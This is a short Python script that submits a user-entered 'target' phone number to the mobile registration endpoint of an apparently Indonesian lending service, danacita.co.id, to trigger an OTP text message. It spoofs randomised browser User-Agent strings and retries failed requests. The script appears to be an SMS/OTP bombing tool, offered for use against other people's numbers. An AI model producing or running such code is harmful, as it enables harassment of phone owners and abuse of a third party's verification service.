import httpx
import json
import random
import logging
import time

# Set up logging
logging.basicConfig(filename='otp_sender.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define colors for terminal output
from colorama import Fore, init
init(autoreset=True)

WhiteTerm = Fore.WHITE
GreenTerm = Fore.GREEN
RedTerm = Fore.RED

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_headers():
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "User-Agent": generate_user_agent()
    }

async def send_otp(api_url, headers, data, retry_attempts=3, initial_delay=2):
    async with httpx.AsyncClient() as client:
        for attempt in range(retry_attempts):
            try:
                response = await client.post(api_url, headers=headers, content=data)
                if response.status_code == 200:
                    logging.info(f"Successfully sent OTP via {api_url} - Attempt {attempt + 1}")
                    print(f"{GreenTerm}Successfully sent OTP via {api_url}")
                    return True
                else:
                    logging.warning(f"Failed to send OTP via {api_url}. Status code: {response.status_code} - Attempt {attempt + 1}")
            except httpx.RequestError as e:
                logging.error(f"Request error occurred: {e} - Attempt {attempt + 1}")
            except httpx.HTTPStatusError as e:
                logging.error(f"HTTP status error occurred: {e} - Attempt {attempt + 1}")

            time.sleep(initial_delay * (2 ** attempt))
        
    print(f"{RedTerm}Failed to send OTP after {retry_attempts} attempts.")
    return False

async def main():
    api_url = "https://api.danacita.co.id/v4/users/mobile_register/"
    input_number = input(f"{WhiteTerm}Enter Target Number (e.g., +628xxx): ")
    data_danacita = json.dumps({"username": input_number})
    
    headers = generate_headers()
    await send_otp(api_url, headers, data_danacita)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
